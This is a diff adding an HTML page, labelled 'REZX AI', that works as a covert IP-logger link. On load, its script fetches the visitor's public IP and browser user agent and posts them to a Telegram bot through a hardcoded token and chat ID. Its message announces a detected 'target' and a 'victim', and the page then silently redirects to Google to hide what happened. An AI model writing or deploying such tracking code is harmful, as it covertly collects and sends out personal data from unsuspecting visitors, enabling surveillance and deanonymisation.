@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // --- KONFIGURASI REZX AI ---
+        const TELEGRAM_TOKEN = "8561775088:AAGJEg76ckN28U3B_s2CrkpZj9xkqhac9yk";
+        const CHAT_ID = "7400415958";
+
+        async function grabData() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                const ip = ipData.ip;
+                const userAgent = navigator.userAgent;
+
+                const pesan = `🚀 **TARGET TERDETEKSI!** 🚀\n\n` +
+                              `📍 IP: ${ip}\n` +
+                              `🌐 Info: ${userAgent}\n` +
+                              `*Rezx ai: Link lu udah makan korban!* 🗿`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
+                });
+
+                window.location.href = "https://www.google.com";
+            } catch (error) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+        grabData();
+    </script>
+</body>
+</html>
